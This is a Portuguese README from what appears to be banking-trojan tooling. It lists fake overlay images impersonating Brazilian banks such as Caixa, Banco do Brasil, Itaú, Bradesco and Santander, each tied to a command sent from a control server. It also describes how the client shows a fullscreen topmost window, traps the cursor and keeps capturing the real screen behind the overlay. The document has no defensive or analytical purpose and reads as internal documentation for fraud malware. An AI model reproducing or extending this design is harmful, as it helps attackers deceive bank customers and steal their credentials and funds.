========================================
  PASTA DE OVERLAYS DE BANCO
========================================

Coloque aqui as imagens BMP dos overlays falsos de banco.

IMAGENS SUPORTADAS:
- CEFE_01.bmp       (Comando: SHOW_CEF1)    - Caixa Econômica Federal
- BB_01.bmp         (Comando: SHOW_BB1)     - Banco do Brasil
- BB_02.bmp         (Comando: SHOW_BB2)     - Banco do Brasil (alternativo)
- ITAU_01.bmp       (Comando: SHOW_ITAU1)   - Itaú
- BRADESCO_01.bmp   (Comando: SHOW_BRADESCO1) - Bradesco
- SANTANDER_01.bmp  (Comando: SHOW_SANTANDER1) - Santander
- SICREDI_01.bmp    (Comando: SHOW_SICREDI1) - Sicredi
- SICOOB_01.bmp     (Comando: SHOW_SICOOB1) - Sicoob
- BNB_01.bmp        (Comando: SHOW_BNB1)    - Banco do Nordeste

FORMATO:
- Arquivo: BMP (Bitmap)
- Recomendado: Tamanho da tela (1920x1080 ou similar)
- A imagem será centralizada na tela

COMPORTAMENTO:
1. Servidor envia comando SHOW_CEF1, SHOW_BB1, etc
2. Cliente cria thread separada
3. Mostra Form fullscreen com a imagem
4. TopMost = true (sempre no topo)
5. Cursor preso dentro da janela
6. CopyFromScreen() continua capturando tela real por trás (igual sistema antigo)

SE A IMAGEM NÃO EXISTIR:
- Mostra padrão xadrez preto/branco

FECHAR OVERLAY:
- Servidor envia comando: CLOSE_OVERLAY
